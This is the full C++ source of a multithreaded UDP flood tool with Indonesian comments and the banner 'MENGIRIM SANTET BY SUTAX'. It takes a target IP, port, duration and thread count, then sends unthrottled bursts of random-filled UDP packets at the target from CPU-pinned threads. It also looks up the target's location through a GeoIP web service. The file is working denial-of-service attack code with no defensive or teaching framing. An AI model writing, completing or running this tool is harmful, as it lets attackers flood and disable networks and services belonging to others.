#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <cstring>
#include <random>
#include <sstream>
#include <iomanip>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sched.h>
#include <curl/curl.h>
#include <pthread.h>  // Tambahan untuk thread affinity

#define DEFAULT_PAYLOAD_SIZE 1024
#define DEFAULT_CPU_AFFINITY 4
#define DEFAULT_BURST 50
#define MAX_PAYLOAD_SIZE 104857600000 // 100MB
#define CUSTOM_PATTERN "\x69\x68\x67"
#define CUSTOM_PATTERN_COUNT 969

std::atomic<uint64_t> total_sent(0);

struct ThreadConfig {
    std::string thread_id;
    std::string ip;
    int port;
    int duration;
    int burst;
    int cpu_affinity;
    int payload_size;
    uint64_t bandwidth_limit; // bytes per second
    std::vector<uint8_t> payload;
};

size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string get_ip_geoinfo(const std::string& ip) {
    CURL* curl = curl_easy_init();
    std::string readBuffer;
    if(curl) {
        std::string url = "http://ip-api.com/json/" + ip;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        if(res == CURLE_OK) return readBuffer;
    }
    return "{}";
}

std::string get_local_ip() {
    struct ifaddrs* ifaddr;
    std::string ip = "unknown";
    if (getifaddrs(&ifaddr) == -1)
        return ip;
    for (struct ifaddrs* ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr) continue;
        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in* sa = (struct sockaddr_in*)ifa->ifa_addr;
            char addr[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(sa->sin_addr), addr, INET_ADDRSTRLEN);
            if (strcmp(addr, "127.0.0.1") != 0) {
                ip = addr;
                break;
            }
        }
    }
    freeifaddrs(ifaddr);
    return ip;
}

void print_sysinfo() {
    struct sysinfo info;
    sysinfo(&info);
    std::cout << "RAM (MB): " << info.totalram / 1024 / 1024 << "\n";
    std::cout << "CPU cores: " << std::thread::hardware_concurrency() << "\n";
    std::cout << "Local IP: " << get_local_ip() << "\n";
}

std::string human_size(uint64_t bytes) {
    std::ostringstream oss;
    double size = bytes;
    const char* suffix[] = { "B", "KB", "MB", "GB", "TB" };
    int i = 0;
    while (size >= 1024 && i < 4) { size /= 1024; i++; }
    oss << std::fixed << std::setprecision(2) << size << " " << suffix[i];
    return oss.str();
}

void build_payload(std::vector<uint8_t>& payload, int payload_size) {
    payload.clear();
    // Masukkan custom pattern sebanyak 369 kali
    for (int i = 0; i < CUSTOM_PATTERN_COUNT; ++i) {
        payload.insert(payload.end(), CUSTOM_PATTERN, CUSTOM_PATTERN + 3);
    }
    // Isi sisa payload dengan byte acak
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    while (payload.size() < static_cast<size_t>(payload_size)) {
        payload.push_back(dis(gen));
    }
    if (payload.size() > static_cast<size_t>(payload_size)) 
        payload.resize(payload_size);
}

void udp_flood_worker(ThreadConfig config, std::atomic<uint64_t>& sent_counter) {
    // Set CPU affinity
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(config.cpu_affinity % std::thread::hardware_concurrency(), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config.port);
    inet_pton(AF_INET, config.ip.c_str(), &target_addr.sin_addr);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    uint64_t thread_sent = 0;
    auto start = std::chrono::steady_clock::now();
    auto report_time = start;
    auto end = start + std::chrono::seconds(config.duration);
    uint64_t max_sent_per_sec = config.bandwidth_limit;
    uint64_t sent_this_sec = 0;
    auto sec_start = start;

    while (std::chrono::steady_clock::now() < end) {
        for (int b = 0; b < config.burst; ++b) {
            ssize_t res = sendto(sock, config.payload.data(), config.payload.size(), 0,
                                 (struct sockaddr*)&target_addr, sizeof(target_addr));
            if (res > 0) {
                thread_sent += res;
                sent_counter += res;
                sent_this_sec += res;
            }
        }
        // Pembatasan bandwidth per detik
        if (max_sent_per_sec > 0 && sent_this_sec >= max_sent_per_sec) {
            std::this_thread::sleep_until(sec_start + std::chrono::seconds(1));
            sec_start = std::chrono::steady_clock::now();
            sent_this_sec = 0;
        }
        // Report tiap 30 detik
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - report_time).count() >= 30) {
            std::cout << "[Thread " << config.thread_id << "] Sent: " << human_size(thread_sent)
                      << " (" << thread_sent << " bytes) in 30s\n";
            report_time = now;
        }
    }
    close(sock);
    std::cout << "[Thread " << config.thread_id << "] Finished. Sent: "
              << human_size(thread_sent) << "\n";
}

int main(int argc, char* argv[]) {
    // Parameter hardcoded dan CLI
    if (argc < 5) {
        std::cout << "Usage: ./stx <ip> <port> <durasi> <thread>\n";
        return 1;
    }
    std::string ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int n_thread = std::stoi(argv[4]);

    // Parameter hardcoded
    int payload_size = DEFAULT_PAYLOAD_SIZE;
    int burst = DEFAULT_BURST;
    int cpu_affinity = DEFAULT_CPU_AFFINITY;
    uint64_t bandwidth_limit = 0; // tidak terbatas secara default

    if (payload_size > MAX_PAYLOAD_SIZE)
        payload_size = MAX_PAYLOAD_SIZE;

    std::cout << "MENGIRIM SANTET BY SUTAX\n";
    std::cout << "Target: " << ip << ":" << port << "\n";
    std::cout << "Duration: " << duration << "s  Threads: " << n_thread << "\n";
    std::cout << "Payload size: " << payload_size << " bytes  Burst: " << burst
              << "CPU affinity: " << cpu_affinity << "\n";
    std::cout << "Perthread Bandwidth: ";
    if (bandwidth_limit > 0)
        std::cout << human_size(bandwidth_limit) << "/s\n";
    else
        std::cout << "unlimited\n";

    // Informasi sistem
    print_sysinfo();

    // GeoIP info target
    std::cout << "GeoIP info (target): " << get_ip_geoinfo(ip) << "\n";

    // Bangun payload
    std::vector<uint8_t> payload;
    build_payload(payload, payload_size);

    // Membuat thread
    std::vector<std::thread> threads;
    std::vector<std::string> thread_ids;
    for (int i = 0; i < n_thread; ++i) {
        // Menggunakan base hex untuk thread id
        std::stringstream ss;
        ss << std::setw(2) << std::setfill('0') << std::uppercase << std::hex << i;
        thread_ids.push_back(ss.str());
    }

    std::atomic<uint64_t> sent_counter(0);
    for (int i = 0; i < n_thread; ++i) {
        ThreadConfig config;
        config.thread_id = thread_ids[i % thread_ids.size()];
        config.ip = ip;
        config.port = port;
        config.duration = duration;
        config.burst = burst;
        config.cpu_affinity = cpu_affinity + i;
        config.payload_size = payload_size;
        config.bandwidth_limit = bandwidth_limit;
        config.payload = payload;
        threads.emplace_back(udp_flood_worker, config, std::ref(sent_counter));
    }

    // Global reporting setiap 30 detik
    std::thread reporter([&]() {
        for (int t = 0; t < duration; t += 30) {
            std::this_thread::sleep_for(std::chrono::seconds(30));
            uint64_t sent = sent_counter.load();
            double gb = sent / 1024.0 / 1024.0 / 1024.0;
            std::cout << "[GLOBAL] " << human_size(sent)
                      << " (" << std::fixed << std::setprecision(2) << gb << " GB) sent so far\n";
        }
    });

    for (auto& th : threads)
        th.join();
    reporter.join();

    uint64_t total = sent_counter.load();
    double gb = total / 1024.0 / 1024.0 / 1024.0;
    std::cout << "Total sent: " << human_size(total) << " (" << std::fixed << std::setprecision(2) << gb << " GB)\n";
    std::cout << "GeoIP info (server): " << get_ip_geoinfo(get_local_ip()) << "\n";
    return 0;
}
